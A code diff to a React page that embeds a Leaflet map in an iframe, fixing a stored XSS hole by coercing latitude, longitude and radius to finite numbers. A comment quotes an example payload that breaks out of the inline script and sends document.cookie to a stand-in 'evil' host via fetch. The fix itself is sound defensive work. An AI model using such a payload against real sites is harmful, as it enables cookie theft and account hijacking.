@@ -286,11 +286,35 @@ export default function LokasiPage() {
                 marginTop: 4,
               }}
             >
-              <iframe
-                title="lok-map"
-                style={{ width: "100%", height: "100%", border: "none" }}
-                srcDoc={`<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script><style>body{margin:0}#m{height:100vh}</style></head><body><div id="m"></div><script>var la=${form.latitude || 0},ln=${form.longitude || 0},r=${form.radius || 500};var m=L.map('m').setView([la||-0.5,ln||101.4],la?14:5);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);var mk=null,ci=null;function up(a,b){if(mk)m.removeLayer(mk);if(ci)m.removeLayer(ci);mk=L.marker([a,b]).addTo(m);ci=L.circle([a,b],{radius:r,color:'#3388ff',fillOpacity:0.12}).addTo(m)}if(la&&ln)up(la,ln);m.on('click',function(e){up(e.latlng.lat,e.latlng.lng);window.parent.postMessage({t:'lok-map',lat:e.latlng.lat.toFixed(6),lng:e.latlng.lng.toFixed(6)},'*')})<\/script></body></html>`}
-              />
+              {/*
+                SECURITY (Stored XSS, Tahap 3):
+                The lat/lng inputs on this page are plain text inputs
+                (not type="number"), so an admin can type literally
+                anything — including a payload that breaks out of the
+                JS expression context in the iframe srcDoc below:
+                  -0.5);fetch('https://evil/'+document.cookie);//
+                Coerce to a finite Number at the point of
+                interpolation so the iframe never sees a non-numeric
+                value. Defense in depth — parseFloat on save and the
+                float DB column already provide upstream protection,
+                but the iframe shouldn't depend on them.
+              */}
+              {(() => {
+                const num = (v: any, def: number) => {
+                  const n = Number(v);
+                  return Number.isFinite(n) ? n : def;
+                };
+                const la = num(form.latitude, 0);
+                const ln = num(form.longitude, 0);
+                const r = num(form.radius, 500);
+                return (
+                  <iframe
+                    title="lok-map"
+                    style={{ width: "100%", height: "100%", border: "none" }}
+                    srcDoc={`<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script><style>body{margin:0}#m{height:100vh}</style></head><body><div id="m"></div><script>var la=${la},ln=${ln},r=${r};var m=L.map('m').setView([la||-0.5,ln||101.4],la?14:5);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);var mk=null,ci=null;function up(a,b){if(mk)m.removeLayer(mk);if(ci)m.removeLayer(ci);mk=L.marker([a,b]).addTo(m);ci=L.circle([a,b],{radius:r,color:'#3388ff',fillOpacity:0.12}).addTo(m)}if(la&&ln)up(la,ln);m.on('click',function(e){up(e.latlng.lat,e.latlng.lng);window.parent.postMessage({t:'lok-map',lat:e.latlng.lat.toFixed(6),lng:e.latlng.lng.toFixed(6)},'*')})<\/script></body></html>`}
+                  />
+                );
+              })()}
             </div>
           </div>
           <div className="form-row">
